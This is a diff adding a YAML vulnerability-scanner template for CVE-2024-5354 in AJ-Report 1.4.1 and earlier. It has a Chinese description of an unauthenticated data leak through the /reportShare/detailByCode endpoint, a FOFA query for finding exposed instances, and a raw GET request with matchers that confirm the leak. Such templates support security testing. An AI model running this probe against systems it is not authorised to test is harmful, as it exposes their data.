@@ -1,0 +1,28 @@
+id: aj-report-detailbycode-info-leak
+
+info:
+  name: "AJ-Report detailByCode 接口未授权访问导致敏感数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="AJ-Report"
+      AJ-Report 1.4.1及更早版本在/reportShare/detailByCode接口中存在参数处理缺陷。通过构造特定shareToken参数值，攻击者可绕过访问控制机制获取非授权敏感数据。该漏洞允许远程未认证攻击者获取系统内部信息，相关利用方式已公开披露。
+  reference:
+  - CVE-2024-5354
+  tags: AJ-Report
+
+http:
+- raw:
+  - |
+    GET /reportShare/detailByCode?shareCode=QRK5ta8g HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'shareToken'
